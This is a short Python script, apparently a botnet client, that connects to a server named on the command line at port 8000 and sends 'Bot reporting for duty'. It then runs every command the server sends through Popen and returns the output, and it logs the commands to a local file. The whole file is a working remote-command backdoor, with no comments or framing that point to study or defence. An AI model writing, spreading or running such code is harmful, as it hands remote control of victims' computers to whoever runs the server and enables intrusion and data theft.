from subprocess import Popen, PIPE
import sys
import socket

server_name = sys.argv[1]
server_port = 8000

client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_sock.connect((server_name, server_port))
client_sock.send('Bot reporting for duty'.encode())
command = (client_sock.recv(4064)).decode()
stream = open('recent_commands.txt', 'a')
while command != 'exit':
    try:
        proc = Popen(command.split(' '), stdout=PIPE, stderr=PIPE)
    except:
        client_sock.send(("the command: " + command + " is NOT FOUND").encode())
        command = (client_sock.recv(4064)).decode()  # get a command again
        continue
    result, err = proc.communicate()
    client_sock.send(result)
    command = (client_sock.recv(4064)).decode()
    stream.write(command + "\n")

stream.flush()
stream.close()
client_sock.close()
